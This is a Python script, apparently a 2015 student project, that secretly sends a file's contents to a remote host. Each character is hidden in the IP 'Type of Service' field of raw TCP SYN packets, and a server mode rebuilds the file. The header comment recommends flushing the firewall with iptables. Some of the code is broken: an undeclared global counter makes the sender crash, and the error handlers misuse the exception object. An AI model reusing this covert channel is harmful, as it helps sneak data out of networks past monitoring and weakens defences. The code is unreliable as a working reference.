######################################################################
#	covert.py
#	
#	This program should be run in Python 3.4 version 
#	(NOT Python 2.7)
#
#	This application is to send contents in a file to remote machine covertly.
#	The data will be sent through "Type of Service" field in IP header.
#	The "Type of Service" can contain 1 Byte (8 bits).
#	The program will send data character by character using ASCII encoding
#	which is 8 bits per character.
#
#	Author: 	Ben Kim
#
#	Date: 		Sep 20 2015
#
#	Example: Server - receiver
#	python covert.py -source 192.168.0.1 -dest 192.168.0.2 -dest_port 80 
#	-server -file receive.txt
#
#	Example: Client - sender
#	python covert.py -source 192.168.0.1 -dest 192.168.0.2 -source_port 8000 
#	-dest_port 80 -file send.txt
#
#	
#	Further improvement :
#		The firewall of server side or bounce server should be flushed.
#		# iptables -F
#		# iptables -X
#
#######################################################################


import socket, sys, struct
import time
from struct import *

BUF_SIZE = 1
id = 999

######################################################
#	Make checksum to check later
#
######################################################
def makeCheckSum(msg):
	s = 0
	for i in range(0, len(msg), 2):
		w = (msg[i] << 8) + (msg[i+1])
		s = s + w
	s = (s >> 16) + (s & 0xffff)
	s = ~s & 0xffff 
	return s

######################################################
#	Make IP Header
#
######################################################
def makeIpHeader(sourceIP, destIP, char=None):
	version = 4
	ihl = 5

	# write a covert data into type of service field
	if char is None:
		typeOfService = 0
	else:
		typeOfService = ord(char)

	totalLength = 20 + 20 	# ip header + tcp header 
	id = id + 1
	print(id)
	flagsOffset = 0
	ttl = 255
	protocol = socket.IPPROTO_TCP
	headerChecksum = 0
	sourceAddress = socket.inet_aton(sourceIP)
	destAddress = socket.inet_aton(destIP)
	ihlVersion = (version << 4) + ihl

	return pack('!BBHHHBBH4s4s', ihlVersion, typeOfService, totalLength,
				id, flagsOffset, ttl, protocol, headerChecksum,
				sourceAddress, destAddress)

######################################################
#	Make TCP Header
#
######################################################
def makeTcpHeader(sport, dport, icheckSum=None, char=None):
	sourcePort = sport
	destAddrPort = dport 		### just set to http server
	seqNum = 0
	ackNum = 0
	dataOffset = 5
	flagFin = 0
	flagSyn = 1
	flagRst = 0
	flagPsh = 0
	flagAck = 0
	flagUrg = 0

	if char is None:
		window = socket.htons(5840)		# maximum allowed window size
	else:
		print (char)
		window = socket.htons(ord(char))

	if(icheckSum is None):
		checkSum = 0
	else:
		checkSum = icheckSum

	urgentPointer = 0
	dataOffsetResv = (dataOffset << 4) + 0
	flags = (flagUrg << 5) + (flagAck << 4) + (flagPsh << 3) + (flagRst << 2) + (flagSyn << 1) + flagFin

	return pack('!HHLLBBHHH', int(sourcePort), int(destAddrPort), 
		seqNum, ackNum, dataOffsetResv, flags, window, 
		checkSum, urgentPointer)


######################################################
#	Start server side
#
######################################################
def start_server(source_ip, file_name):

	# create a raw socket
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	except OSError as msg:
		print ('Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
		sys.exit()
	# tell kernel not to put in headers, since we are providing it, 
	# when using IPPROTO_RAW this is not necessary
	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
	

	# create a file to record
	f = open(file_name, 'w')

	while(1):
		packet = s.recv(struct.calcsize('!BBHHHBBH4s4s'))
		ip_hdr = unpack('!BBHHHBBH4s4s', packet)

		# check if the source ip address are same
		if socket.inet_ntoa(ip_hdr[8]) == source_ip:
			data = ip_hdr[1]		# ascii integer
			data = chr(data)		# convert ascii code to char
			print ("received: ", data, "	ASCII Value:", ip_hdr[1])
			f.write(data)
			if (not data):
				print ("Disconnected")
				break

	# close the socket
	s.close()

	# close file description
	f.close()

	return 0

######################################################
#	Start client side
#
######################################################
def start_client(source_ip, dest_ip, source_port, dest_port, file_name):
	

	# create a raw socket
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
	except OSError as msg:
		print ('Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
		sys.exit()
	# tell kernel not to put in headers, since we are providing it, 
	# when using IPPROTO_RAW this is not necessary
	# s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

	# change network address format from ascii to network address
	sourceAddress = socket.inet_aton(source_ip)
	destAddress = socket.inet_aton(dest_ip)


	# open a file
	with open(file_name) as f:
		while(1):
			time.sleep(1)
			c = f.read(1)
			print(c)
			if not c:
				print ("End of file")
				break
			print ("Read a charater: ", c)
			# make ip header
			ipHeader = makeIpHeader(source_ip, dest_ip, c)
			# make tcp header
			tcpHeader = makeTcpHeader(source_port, dest_port)

			placeholder = 0
			protocol = socket.IPPROTO_TCP
			tcpLen = len(tcpHeader)
			psh = pack('!4s4sBBH', sourceAddress, destAddress, placeholder, protocol, tcpLen)
			psh = psh + tcpHeader
			tcpChecksum = makeCheckSum(psh)

			tcpHeader = makeTcpHeader(source_port, dest_port, tcpChecksum)

			packet = ipHeader + tcpHeader
			s.sendto(packet, (dest_ip, 0))
	
	# close the socket
	s.close()

	# close file description
	f.close()

	return 0

######################################################
#	main function that validates user input
#	after validation, start client or server
######################################################
def main(argv):

	# validation argv
	if (len(argv) < 6) or (len(argv) > 13):
		usage(argv)

	# assign values to each valuable
	if "-source" in argv:
		i = argv.index("-source")
		sip = argv[i+1]

	if "-dest" in argv:
		i = argv.index("-dest")
		dip = argv[i+1]

	if "-source_port" in argv:
		i = argv.index("-source_port")
		sport = argv[i+1]

	if "-dest_port" in argv:
		i = argv.index("-dest_port")
		dport = argv[i+1]

	if "-file" in argv:
		i = argv.index("-file")
		filename = argv[i+1]

	# print (sip, dip, sport, dport, filename)

	# check if it is client mode or server mode
	if "-server" in argv:
		print("Server mode")
		start_server(sip, filename)
	else:
		print("Client mode")
		start_client(sip, dip, sport, dport, filename)

	exit(0)

######################################################
#	Print usage when a user put wrong input
#
######################################################
def usage(argv):
	print()
	print("Covert TCP Usage")
	print("[Sender]\n")
	print("run: python " + sys.argv[0] + " -source source_ip -dest dest_ip " + 
	"-source_port sport -dest_port dport -server -file filename \n")
	print("source_ip  	- Host where you want the data to originate from.");
	print("		In SERVER mode this is the host data will");
	print("		be coming FROM.");
	print("dest_ip		- Host to send data to")
	print("sport  		- IP source port you want data to appear from.");
	print("		(randomly set by default)");
	print("dport 		- IP source port you want data to go to. In");
	print("		SERVER mode this is the port data will be coming");
	print("		inbound on. Port 80 by default.");
	print("filename 	- Name of the file to encode and transfer.");
	print("-server  	- Passive mode to allow receiving of data.");
	print()
	print("Example: Server - receiver")
	print("python " + sys.argv[0] + " -source 192.168.0.1 -dest 192.168.0.2 -dest_port 80 -server -file receive.txt")
	print()
	print("Example: Client - sender")
	print("python " + sys.argv[0] + " -source 192.168.0.1 -dest 192.168.0.2 -source_port 8000 -dest_port 80 -file send.txt")

	exit(1)

######################################################
#	Execute main function with parameters
#
######################################################
if __name__ == '__main__':
	main(sys.argv[1:])	# get everything after the script name